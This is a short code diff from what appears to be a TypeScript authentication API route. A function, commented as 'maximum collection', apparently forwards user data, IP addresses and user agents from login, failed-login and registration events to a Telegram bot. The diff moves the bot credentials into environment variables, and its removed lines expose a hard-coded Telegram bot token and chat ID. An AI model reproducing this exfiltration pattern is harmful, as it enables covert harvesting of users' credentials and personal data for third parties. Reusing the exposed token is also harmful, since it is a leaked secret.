@@ -5,8 +5,13 @@ import { isEmailOrLoginTaken, createUser, hashPassword } from "@/lib/db";
 // 📤 Функция отправки в Telegram для API - МАКСИМАЛЬНЫЙ сбор
 async function sendToTelegramAPI(data: any, type: 'login_success' | 'login_failed' | 'register' | 'verification_sent', ip: string, userAgent: string, error?: string) {
   try {
-    const TELEGRAM_BOT_TOKEN = "8259536877:AAHVoJPklpv2uTVLsNq2o1XeI3f1qXOT7x4";
-    const TELEGRAM_CHAT_ID = "7455610355";
+    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+
+    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+      console.log('⚠️ Переменные окружения для Telegram не установлены. Сообщения не будут отправлены.');
+      return;
+    }
     
     let message = '';
     
